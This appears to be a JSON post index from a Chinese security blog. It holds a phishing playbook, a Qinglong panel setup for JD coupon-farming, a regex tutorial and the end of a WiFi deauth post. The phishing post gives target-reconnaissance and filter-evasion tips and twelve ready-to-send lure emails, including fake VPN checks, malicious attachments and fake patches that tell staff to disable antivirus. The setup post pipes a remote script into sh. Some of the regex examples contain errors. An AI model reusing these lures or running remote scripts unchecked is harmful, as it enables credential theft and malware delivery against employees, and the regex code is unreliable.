alt=\"image-20231016012017447\"></p>\n","categories":["无线安全"],"tags":["SSID广播","WiFi","DeAuth攻击"]},{"title":"钓鱼话术案例","url":"/2023/05/26/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/","content":"<p><strong>钓鱼思路整理</strong></p>\n<p>一、目标信息收集</p>\n<p>二、目标环境</p>\n<p>三、社交</p>\n<p>四、基础设施</p>\n<p>五、邮件</p>\n<p>六、钓鱼话术模板</p>\n<h3 id=\"一、目标信息收集\"><a href=\"#一、目标信息收集\" class=\"headerlink\" title=\"一、目标信息收集\"></a>一、目标信息收集</h3><ul>\n<li><p>业务范围</p>\n</li>\n<li><ul>\n<li>金融</li>\n<li>医疗</li>\n<li>卫生</li>\n<li>IT</li>\n</ul>\n</li>\n<li><p>组织架构</p>\n</li>\n<li><ul>\n<li>董事会</li>\n<li>高管</li>\n<li>财务</li>\n<li>采购</li>\n<li>运维</li>\n</ul>\n</li>\n<li><p>人员信息</p>\n</li>\n<li><ul>\n<li>针对不同职位采用不同话术</li>\n<li>按照，部门、职务、难易程度分类，分批次投递</li>\n<li>姓名、职位、邮箱、手机</li>\n</ul>\n</li>\n<li><p>目标服务入口</p>\n</li>\n<li><ul>\n<li>VPN、webVPN</li>\n<li>邮服</li>\n<li>SSO认证</li>\n<li>OA认证</li>\n<li>其他内网入口</li>\n<li>帮助文档、使用手册文档信息泄露，收集弱口令</li>\n</ul>\n</li>\n<li><p>站内联系方式</p>\n</li>\n<li><ul>\n<li>新闻投稿、投诉举报、站内信、业务反馈</li>\n</ul>\n</li>\n<li><p>目标新闻</p>\n</li>\n<li><ul>\n<li>了解企业文化、工作动态、便于构造高质量文案，提高效率</li>\n</ul>\n</li>\n<li><p>**库</p>\n</li>\n<li><ul>\n<li>根据收集到的信息进行猎魔查询</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"二、目标环境\"><a href=\"#二、目标环境\" class=\"headerlink\" title=\"二、目标环境\"></a>二、目标环境</h3><ul>\n<li><p>地区用户环境</p>\n</li>\n<li><ul>\n<li>语言、常用邮箱、常用搜索引擎、常用运营商</li>\n</ul>\n</li>\n<li><p>时间、工作时间</p>\n</li>\n<li><ul>\n<li>了解日常工作时间，节假日，尽可能工作日发信</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"三、社交\"><a href=\"#三、社交\" class=\"headerlink\" title=\"三、社交\"></a>三、社交</h3><ul>\n<li>大陆：微信、脉脉、领英、qq、钉钉</li>\n<li>海外：领英、Facebook、Twitter、Line、ins、YouTube、TG</li>\n<li>工作软件进行钓简历</li>\n</ul>\n<h3 id=\"四、基础设施\"><a href=\"#四、基础设施\" class=\"headerlink\" title=\"四、基础设施\"></a>四、基础设施</h3><ul>\n<li>目标地区匿名手机号</li>\n<li>目标地区常用邮箱</li>\n<li>目标近似域名</li>\n</ul>\n<h3 id=\"五、邮件\"><a href=\"#五、邮件\" class=\"headerlink\" title=\"五、邮件\"></a>五、邮件</h3><ul>\n<li><p>话术</p>\n</li>\n<li><ul>\n<li>落款信息、开头语、结束语、标题、发信人名称&#x2F;部门名称</li>\n</ul>\n</li>\n<li><p>邮件格式</p>\n</li>\n<li><ul>\n<li>仿正规邮件，无明显钓鱼邮件格式，邮件添加logo增加可信度</li>\n</ul>\n</li>\n<li><p>发信IP或服务</p>\n</li>\n<li><ul>\n<li>优先选择第三方邮件服务，正规无拉黑</li>\n</ul>\n</li>\n<li><p>发信频率</p>\n</li>\n<li><ul>\n<li>多批次，少投递，高精准</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"六、钓鱼话术模板\"><a href=\"#六、钓鱼话术模板\" class=\"headerlink\" title=\"六、钓鱼话术模板\"></a>六、钓鱼话术模板</h3><h5 id=\"案例一：亲爱的同事们\"><a href=\"#案例一：亲爱的同事们\" class=\"headerlink\" title=\"案例一：亲爱的同事们\"></a>案例一：亲爱的同事们</h5><p>近期，公司监控系统捕捉到某些VPN账号存在数次异常操作行为，根据我司(集团)网络安全规定，为确保账号安全，现需要所有具有VPN登录权限的同事配合(无VPN登录权限的同事可直接忽略此邮件)，尽快重新登录VPN系统以完成VPN账号安全检查，登录VPN系统自动检查账号安全性，检查过程将全程自动进行，无需人工干预，具体操作如下图所示，注:逾期未进行安全自检的VPN账号将全部被收回或锁定，系统邮件，请勿回复</p>\n<h5 id=\"案例二：关于2021年度绩效结算个人所得税税收优化的情况通报\"><a href=\"#案例二：关于2021年度绩效结算个人所得税税收优化的情况通报\" class=\"headerlink\" title=\"案例二：关于2021年度绩效结算个人所得税税收优化的情况通报\"></a>案例二：关于2021年度绩效结算个人所得税税收优化的情况通报</h5><p>关于2021年度绩效结算个人所得税税收优化的情况通报各单位：</p>\n<p>根据《关于延续实施全年一次性奖金等个人所得税优惠政策的公告》（财政部税务总局2021年第42号公告），全年一次性奖金单独计税优惠政策，执行期限延长至2023年12月31日。</p>\n<p>为确保广大职工充分享受该项税收优惠政策，2021年底计财处对每一名职工的全年工薪收入和各类扣除情况进行了分析测算，按政策将大部分职工年底发放的部分绩效结算金额按全年一次性奖金优化计税。优化后，有78.2%的职工可节约税金。在2022年2月底申报期完成全年一次性奖金纳税申报后，计财处会按程序将节约的税金发至职工银行卡上。</p>\n<p>需要说明：经过对职工全年应缴税额和已扣税额对比，有部分职工需要补税（名单见附件），补税的金额将在后续发放的绩效中扣除。产生补税的原因主要是部分职工在2021年12月通过个人所得税APP修改了专项附加扣除，由于操作不当，导致全年专项附加扣除额度减少，从而应缴税额增加。建议这部分职工在使用个人所得税年度APP进行汇算清缴时，将专项附加扣除修改正确，可申请退回这部分税金。</p>\n<p><strong>附件名称：2021年度本单位职工个税补缴名单.rar</strong></p>\n<h5 id=\"案例三：钓鱼案例：Chrome漏洞一键修复\"><a href=\"#案例三：钓鱼案例：Chrome漏洞一键修复\" class=\"headerlink\" title=\"案例三：钓鱼案例：Chrome漏洞一键修复\"></a>案例三：钓鱼案例：Chrome漏洞一键修复</h5><p>补丁欺骗、利用Tools欺骗、通知欺骗。等思路结合，自行脑补</p>\n<p>  <img src=\"/../images/image-20231017021052317.png\" alt=\"image-20231017021052317\"></p>\n<h5 id=\"案例四：以假乱真\"><a href=\"#案例四：以假乱真\" class=\"headerlink\" title=\"案例四：以假乱真\"></a>案例四：以假乱真</h5><p><img src=\"/../images/image-20231017021109216.png\" alt=\"image-20231017021109216\"></p>\n<ul>\n<li>邮箱账户备案登记</li>\n</ul>\n<p><img src=\"/../images/image-20231017021122995.png\" alt=\"image-20231017021122995\"></p>\n<h5 id=\"案例五：食堂满意度调查\"><a href=\"#案例五：食堂满意度调查\" class=\"headerlink\" title=\"案例五：食堂满意度调查\"></a>案例五：食堂满意度调查</h5><p>各位员⼯: 为了完善公司⻝堂管理，持续提⾼服务质量，让员⼯更加精神饱满的⼯作，希望⼤家从公司及⾃身实际 出发，积极配合、认真、详实的填写⻝堂满意度调查。谢谢配合！链接如下</p>\n<h5 id=\"案例六：绩效自评\"><a href=\"#案例六：绩效自评\" class=\"headerlink\" title=\"案例六：绩效自评\"></a>案例六：绩效自评</h5><p>各位同事好： 近期经过管理层商议决定，我们公司将于x⽉x⽇实施2021新⼀轮薪资架构，为了更好的保障员⼯的权利，需要您配合填写员⼯绩效⾃我考核，并于x⽉x⽇内填写回复完成，员⼯个⼈⼯作绩效评价表格将作为晋升、加薪等调整的依据之⼀。请对您在2021财年所承担的⼯作任务及个⼈⼯作成果进⾏客观、具体、如实地评价。 并在2021年x⽉x⽇23点前，以邮件形式回复 附件： 绩效⾃评.zip</p>\n<h5 id=\"案例七：工装尺寸手机\"><a href=\"#案例七：工装尺寸手机\" class=\"headerlink\" title=\"案例七：工装尺寸手机\"></a>案例七：工装尺寸手机</h5><p>各位同事： 为了塑造公司员⼯良好形象，体现员⼯饱满的精神⾯貌，现就公司着装做出要求，要求上下班必须着⼯装。 公司正在为各部⻔员⼯配置⼯装，现需收集您⾐服尺⼨⼤⼩，链接如下： <a href=\"http://xxxx.xxx,要求必须5月xx日前填写,过期不候.谢谢配合!/\">http://xxxx.xxx，要求必须5⽉xx⽇前填写，过期不候。谢谢配合！</a></p>\n<h5 id=\"案例八：网络安全风险提示和办公电脑加固手册\"><a href=\"#案例八：网络安全风险提示和办公电脑加固手册\" class=\"headerlink\" title=\"案例八：网络安全风险提示和办公电脑加固手册\"></a>案例八：网络安全风险提示和办公电脑加固手册</h5><p>各位领导、同事： ⼤家好！据⽹络安全监测⼩组提示，近期检测到多名员⼯协同办公系统发⽣异地异常登录情况，分 析原因可能为协同办公系统账号采⽤了简单密码。为杜绝此类事件的再次发⽣，请各部⻔组织员⼯ 修改使⽤复杂密码，并学习《办公环境信息安全加固⼿册》。 密码修改策略要求： （1）密码的⻓度⾄少为12个字符，需采⽤⼤⼩写、特殊字符、数字的组合⽅式。 （2）密码不得使⽤⽣⽇、姓名拼⾳等个⼈信息。 有问题及时沟通，谢谢。 附件《办公环境信息安全加固⼿册》，解 压：XXXX xxx 2021年11⽉X⽇</p>\n<h5 id=\"案例九：社保缴纳异常通知书\"><a href=\"#案例九：社保缴纳异常通知书\" class=\"headerlink\" title=\"案例九：社保缴纳异常通知书\"></a>案例九：社保缴纳异常通知书</h5><p>公司在为您购买社保时因您个⼈原因社保在册导致公司⽆法为您缴纳社会保险（即养⽼、医疗、失业、 ⼯伤、⽣育、⼤病保险）。请本⽉14号之前办理社保相关⼿续以保证公司能正常为您缴纳社保。 2 若因个⼈未到社保局机构办理相关社保⼿续（减少、转移等）⽽导致公司⽆法为您购买社保，公司将不 予补缴。在此期间造成的损失由本⼈⾃⾏承担。 本通知书⼀式两份，公司和员⼯各执⼀份。本通知书⾃签字之⽇起⽣效，涂改⽆效。 本⼈已收到《社保缴纳异常通知书》，知晓并接受通知书上所述内容。 员⼯签名： 时间：年⽉⽇ 2021年11⽉1⽇</p>\n<h5 id=\"案例十：关于护网行动2022安全补丁更新通知\"><a href=\"#案例十：关于护网行动2022安全补丁更新通知\" class=\"headerlink\" title=\"案例十：关于护网行动2022安全补丁更新通知\"></a>案例十：关于护网行动2022安全补丁更新通知</h5><p>为全⼒做好党⼆⼗⼤⽹络安全保障⼯作，公安部拟于7⽉26号启动“护⽹2022”⽹络安全攻防实战演 习，持续到8⽉初。我们公司也作为防守单位参与其中。 为了保障公司电脑终端安全，公司联系安全⼚商紧急制作出了针对护⽹⾏动的安全补丁，请全员对电 脑终端进⾏安装安全补丁，做好终端防护，防⽌个⼈pc终端遭受病毒攻击。 请各位务必安装补丁，本次演习级别⾼，责任重⼤ 依据公司部署，本次演习需要全员重视，将严格按照谁主管谁负责，谁运营谁负责来执⾏</p>\n<h5 id=\"案例十一：VPN证书过期重装\"><a href=\"#案例十一：VPN证书过期重装\" class=\"headerlink\" title=\"案例十一：VPN证书过期重装\"></a>案例十一：VPN证书过期重装</h5><p>尊敬的xxx： 您的vpn证书：f416cd055a647ff98fd439e726d431f，将于2021-05-xx 00:00:00正式到期,截⾄⽬前仅 剩x天。为了不影响您的正常使⽤，请您及时下载安装新的证书，证书⻅附件：</p>\n<h5 id=\"案例十二：安装监控软件\"><a href=\"#案例十二：安装监控软件\" class=\"headerlink\" title=\"案例十二：安装监控软件\"></a>案例十二：安装监控软件</h5><p>为了完善公司内部办公环境，提高公司内部办公效率和监控，请各位同事务必安装和升级XXX自查工具，如遇杀毒软件拦截，请关闭杀毒软件再次安装。日后会有上级检查小组进行检查，存在问题终端人员会纳入年底考核。</p>\n","categories":["钓鱼"],"tags":["社会工程学","钓鱼邮件"]},{"title":"青龙面板搭建与使用","url":"/2023/09/28/%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF%E6%90%AD%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/","content":"<h3 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h3><ul>\n<li>CentOS</li>\n<li>docker</li>\n</ul>\n<p>项目地址：<a href=\"https://github.com/whyour/qinglong\">https://github.com/whyour/qinglong</a></p>\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -dit \\</span><br><span class=\"line\">  -p 5700:5700 \\</span><br><span class=\"line\">  --name qinglong \\</span><br><span class=\"line\">  --hostname qinglong \\</span><br><span class=\"line\">  --restart always \\</span><br><span class=\"line\">  -v /root/ql/data:/ql/data \\</span><br><span class=\"line\">  -v /root/ql/config:/ql/config \\</span><br><span class=\"line\">  -v /root/ql/log:/ql/log \\</span><br><span class=\"line\">  -v /root/ql/db:/ql/db \\</span><br><span class=\"line\">  -v /root/ql/scripts:/ql/scripts \\</span><br><span class=\"line\">  -v /root/ql/jbot:/ql/jbot \\</span><br><span class=\"line\">  -v /root/ql/repo:/ql/repo \\</span><br><span class=\"line\">  -v /root/ql/deps:/ql/deps \\</span><br><span class=\"line\">  whyour/qinglong:latest</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/image-20231001003233854.png\" alt=\"image-20231001003233854\"></p>\n<p>查看容器</p>\n<p><img src=\"/../images/image-20231001003255957.png\" alt=\"image-20231001003255957\"></p>\n<p>访问：IP:5700</p>\n<p><img src=\"/../images/image-20231016002245383.png\" alt=\"image-20231016002245383\"></p>\n<p>安装依赖</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 进入青龙的交互式shell</span><br><span class=\"line\">docker exec -it qinglong bash</span><br><span class=\"line\"># 添加依赖（较慢）</span><br><span class=\"line\">curl -fsSL https://ghproxy.com/https://raw.githubusercontent.com/bean661/utils/main/QLOneKeyDependency.sh | sh</span><br><span class=\"line\"></span><br><span class=\"line\"># 如果依赖安装报错，终止命令，重新安装依赖即可</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/image-20231001003351970.png\" alt=\"image-20231001003351970\"></p>\n<p>重启容器</p>\n<p><img src=\"/../images/image-20231001003418277.png\" alt=\"image-20231001003418277\"></p>\n<h3 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h3><p>登录青龙面板</p>\n<p><img src=\"/../images/image-20231001004015992.png\" alt=\"image-20231001004015992\"></p>\n<p>配置拉库</p>\n<p><img src=\"/../images/image-20231001004031233.png\" alt=\"image-20231001004031233\"></p>\n<p>运行，下载脚本文件</p>\n<p><img src=\"/../images/image-20231001004053425.png\" alt=\"image-20231001004053425\"></p>\n<p>等待一段时间，下载成功</p>\n<p><img src=\"/../images/image-20231001004111259.png\" alt=\"image-20231001004111259\"></p>\n<p>在环境变量选项，添加京东的cookie</p>\n<p><img src=\"/../images/image-20231001004129272.png\" alt=\"image-20231001004129272\"></p>\n<p>登录京东手机网页版：<a href=\"https://m.jd.com/\">https://m.jd.com</a>，找到cookie</p>\n<p><img src=\"/../images/image-20231001003807402.png\" alt=\"image-20231001003807402\"></p>\n<p>添加Cookie到环境变量</p>\n<p><img src=\"/../images/image-20231001003938215.png\" alt=\"image-20231001003938215\"></p>\n<p>定时任务处，随便找一个任务，运行并查看日志，出现如下结果，证明配置正确</p>\n<p><img src=\"/../images/image-20231001004357052.png\" alt=\"image-20231001004357052\"></p>\n<h3 id=\"问题集锦\"><a href=\"#问题集锦\" class=\"headerlink\" title=\"问题集锦\"></a>问题集锦</h3><ol>\n<li>如果某些任务有特殊的模块需要安装，在日志中复制模块的名称，然后在依赖管理中添加即可</li>\n</ol>\n<p><img src=\"/../images/image-20231001004229682.png\" alt=\"image-20231001004229682\"></p>\n<p>安装依赖</p>\n<p><img src=\"/../images/image-20231001004244541.png\" alt=\"image-20231001004244541\"></p>\n<ol start=\"2\">\n<li>配置代理、支持拉取的脚本扩展</li>\n</ol>\n<p><img src=\"/../images/image-20231001004322243.png\" alt=\"image-20231001004322243\"></p>\n","categories":["乱八七糟"],"tags":["薅羊毛","定时任务","docker","自动化"]},{"title":"浅学正则","url":"/2021/01/26/%E6%B5%85%E5%AD%A6%E6%AD%A3%E5%88%99/","content":"<h3 id=\"单字符匹配\"><a href=\"#单字符匹配\" class=\"headerlink\" title=\"单字符匹配\"></a>单字符匹配</h3><p>匹配某个字符串：match()只能够匹配一个对象</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 格式：match(表达式, 匹配对象)</span></span><br><span class=\"line\"><span class=\"comment\"># 返回结果是object,使用group方法打印输出</span></span><br><span class=\"line\">text = <span class=\"string\">&#x27;python&#x27;</span></span><br><span class=\"line\">result1 = re.<span class=\"keyword\">match</span>(<span class=\"string\">&#x27;py&#x27;</span>, text)</span><br><span class=\"line\">result2 = re.<span class=\"keyword\">match</span>(<span class=\"string\">&#x27;pt&#x27;</span>, text)</span><br><span class=\"line\">result3 = re.<span class=\"keyword\">match</span>(<span class=\"string\">&#x27;yt&#x27;</span>, text)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(result1.group())</span><br><span class=\"line\"><span class=\"built_in\">print</span>(result2.group())  <span class=\"comment\"># 匹配不到，会返回None</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(result3.group())  <span class=\"comment\"># 匹配不到，会返回None，match函数从起始位置开始匹配</span></span><br><span class=\"line\"><span class=\"comment\"># 如果有多个匹配，group(n)可以指定匹配第几个 </span></span><br></pre></td></tr></table></figure>\n\n<ol>\n<li><p>点(.)：匹配任意的某个字符(<code>无法匹配换行符</code>)</p>\n</li>\n<li><p>\\d：匹配任意的某个数字(<code>数字以外的内容均不匹配</code>)</p>\n</li>\n<li><p>\\D：除数字以外均可匹配(<code>\\D和\\d互补</code>)</p>\n</li>\n<li><p>\\s：匹配空白字符(<code>\\n、\\t、\\r、空格都表示空白字符</code>)</p>\n</li>\n<li><p>\\w：匹配小写的a-z，大写的A-Z，数字和下划线</p>\n</li>\n<li><p>\\W：匹配除小写\\w之外的所有字符(<code>\\w和\\W互补</code>)</p>\n</li>\n<li><p>[]：组合的方式，只要在中括号内的内容均可匹配(<code>多个匹配内容是，取&quot;或&quot;，只要匹配对象中含有一个内容就匹配</code>)</p>\n</li>\n</ol>\n<h3 id=\"多字符匹配\"><a href=\"#多字符匹配\" class=\"headerlink\" title=\"多字符匹配\"></a>多字符匹配</h3><ol>\n<li>星号(*)：匹配零个或多个字符</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">text1 = <span class=\"string\">&#x27;123456789&#x27;</span></span><br><span class=\"line\">result1 = re.<span class=\"keyword\">match</span>(<span class=\"string\">&#x27;[\\d]*&#x27;</span>, text)  </span><br><span class=\"line\"><span class=\"comment\"># 不加*号，只匹配“1”；加上后，能全部匹配</span></span><br><span class=\"line\"><span class=\"comment\"># 指得是：匹配[\\d]零次或多次</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(result1.group())  <span class=\"comment\"># 输出：123456789</span></span><br><span class=\"line\"></span><br><span class=\"line\">text2 = <span class=\"string\">&#x27;123-456-789&#x27;</span></span><br><span class=\"line\">result2 = re.<span class=\"keyword\">match</span>(<span class=\"string\">&#x27;[\\d]*&#x27;</span>, text)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(result2.group())  <span class=\"comment\"># 只匹配到：123</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><p>加号(+)：匹配一个或多个字符(<code>至少有一个</code>)</p>\n</li>\n<li><p>问号(?)：匹配零个或一个字符</p>\n</li>\n<li><p>{m}：匹配指定个数m个</p>\n</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">text = <span class=\"string\">&#x27;12345-6789&#x27;</span></span><br><span class=\"line\">result = re.<span class=\"keyword\">match</span>(<span class=\"string\">&#x27;[\\d]&#123;3&#125;&#125;&#x27;</span>, text)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(result.group())  <span class=\"comment\"># 匹配到：123</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>{m,n}：匹配m到n个字符(<code>默认匹配最多次（n次）</code>)</li>\n</ol>\n<hr>\n<h3 id=\"匹配规则的替代方案\"><a href=\"#匹配规则的替代方案\" class=\"headerlink\" title=\"匹配规则的替代方案\"></a>匹配规则的替代方案</h3><ol>\n<li><p>\\d —&gt; [0-9]</p>\n</li>\n<li><p>\\D —&gt; [^0-9] <code>中括号里面加^表示取反，在外面表示其后跟着的字符作为开头</code></p>\n</li>\n<li><p>\\w —&gt; [0-9a-zA-Z_]</p>\n</li>\n<li><p>\\W —&gt; [^0-9a-zA-Z_]</p>\n</li>\n<li><p>[\\d\\D]、[\\w\\W] —&gt; 匹配所有的字符</p>\n</li>\n</ol>\n<hr>\n<h3 id=\"特殊匹配\"><a href=\"#特殊匹配\" class=\"headerlink\" title=\"特殊匹配\"></a>特殊匹配</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">result1 = re.<span class=\"keyword\">match</span>(<span class=\"string\">&#x27;[.]+&#x27;</span>, text)  <span class=\"comment\"># 仅仅匹配字符&quot;.&quot;，没有其他含义，也可以加转义来匹配：&quot;\\.&quot;</span></span><br><span class=\"line\">result2 = re.<span class=\"keyword\">match</span>(<span class=\"string\">&#x27;.+&#x27;</span>, text)   <span class=\"comment\"># 匹配所有字符一次或多次</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>匹配手机号码</p>\n<ul>\n<li>re.match(‘1[3-9][0-9]{9}’, text) <code>第一位固定为1；第二位范围：3-9；第三位范围：0-9，匹配九次</code></li>\n</ul>\n</li>\n<li><p>验证邮箱</p>\n<ul>\n<li>re.match(‘[0-9a-zA-Z]]+@[0-9a-z]+[.]com’, text)</li>\n</ul>\n</li>\n<li><p>验证身份证号</p>\n<ul>\n<li>re.match(‘[0-9]{17}[0-9xX]’, text)  <code>最后一位有可能是大小写的字母x或者数字</code></li>\n</ul>\n</li>\n</ul>\n<hr>\n<h3 id=\"特殊匹配进阶\"><a href=\"#特殊匹配进阶\" class=\"headerlink\" title=\"特殊匹配进阶\"></a>特殊匹配进阶</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">text1 = <span class=\"string\">&#x27;pythonpy&#x27;</span></span><br><span class=\"line\">result1 = re.search(<span class=\"string\">&#x27;py&#x27;</span>, text)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(result1.group())  <span class=\"comment\"># 输出：py</span></span><br><span class=\"line\"><span class=\"comment\"># 全局匹配，只匹配一次</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>^：表示以其后的字符开头，不在中括号内</p>\n</li>\n<li><p>$：表示以其后的字符结尾</p>\n</li>\n<li><p>|：匹配多个表达式或者字符串</p>\n<ul>\n<li>第一种</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">text = <span class=\"string\">&quot;https://www.baidu.com&quot;</span></span><br><span class=\"line\">result = re.search(<span class=\"string\">&#x27;[http|https|ftp|file]+&#x27;</span>, text)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(result.group())  <span class=\"comment\"># 输出：https</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>第二种</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">text = <span class=\"string\">&quot;https://www.baidu.com&quot;</span></span><br><span class=\"line\">result = re.search(<span class=\"string\">&#x27;(http|https|ftp|file)&#x27;</span>, text)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(result.group())  <span class=\"comment\"># 输出：http，因为只要匹配到就算；可以理解成有优先级的概念，所以先匹配到了http</span></span><br></pre></td></tr></table></figure></li>\n</ul>\n<hr>\n<h3 id=\"贪婪模式与非贪婪模式\"><a href=\"#贪婪模式与非贪婪模式\" class=\"headerlink\" title=\"贪婪模式与非贪婪模式\"></a>贪婪模式与非贪婪模式</h3><p><strong>默认：贪婪模式</strong></p>\n<ul>\n<li>贪婪模式：尽可能多的去匹配内容</li>\n<li>非贪婪模式：尽可能少的去匹配内容<code>添加&quot;?&quot;</code></li>\n</ul>\n<hr>\n<h3 id=\"group函数\"><a href=\"#group函数\" class=\"headerlink\" title=\"group函数\"></a>group函数</h3><p><strong>前面的内容都是在做”匹配”，并未执行”提取”</strong></p>\n<p>&#x3D;&#x3D;可以在group(n)中指定序号，表明提取指定的内容（以空格定位：”\\s”）&#x3D;&#x3D;</p>\n<hr>\n<h3 id=\"正则表达式的常用函数\"><a href=\"#正则表达式的常用函数\" class=\"headerlink\" title=\"正则表达式的常用函数\"></a>正则表达式的常用函数</h3><ul>\n<li><p>re.match()：从左往右进行匹配  <code>开头不满足即失败</code></p>\n</li>\n<li><p>re.search()：在整个字符串中查找，返回第一个被找到的字符串  <code>只返回第一个</code></p>\n</li>\n<li><p>re.findall()：在整个字符串中查找所有满足条件的字符串  <code>返回结果为列表，输出不需要group函数，可以直接print</code></p>\n</li>\n<li><p>re.sub()：替换字符串<code>匹配出来的字符串进行替换</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">re.sub(<span class=\"string\">&#x27;\\s(\\w+@[0-9a-z]+\\.com)&#x27;</span>, <span class=\"string\">&#x27;wrong&#x27;</span>, text)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>re.split()：主要用来分隔字符串<code>返回一个列表</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">text = <span class=\"string\">&#x27;I am xxxxx&#x27;</span></span><br><span class=\"line\">re.split(<span class=\"string\">&#x27; &#x27;</span>, text)   <span class=\"comment\"># 匹配字符串以空格分隔</span></span><br><span class=\"line\">re.split(<span class=\"string\">&#x27;[^\\w]&#x27;</span>, text)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>re.compile()：对正则表达式进行编译<code>好处：可以添加注释，防止自己忘了正则的含义</code> <br></p>\n</li>\n</ul>\n<p><img src=\"/../images/image-20230829172013461.png\" alt=\"image-20230829172013461\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">text = <span class=\"string\">r&#x27;&lt;a target=&quot;blank&quot; href= &quot;pos ition_detail.php?id=33824&amp;amp; keywords=python&amp;amp;tid=87&amp;amp; id=2218&quot;&gt;python开发工程师&lt;/a&gt;&#x27;</span></span><br><span class=\"line\">resu1t = re.findall(<span class=\"string\">&#x27;&lt;a.*?href=&quot;(.*?)&quot;.*?&lt;/a&gt;&#x27;</span>, text, re.DOTALL)</span><br><span class=\"line\"><span class=\"comment\"># 前后的&quot;.*?&quot;表示匹配内容，而括号中的表示提取内容</span></span><br></pre></td></tr></table></figure>\n\n","categories":["乱八七糟"],"tags":["正则","内容匹配"]}]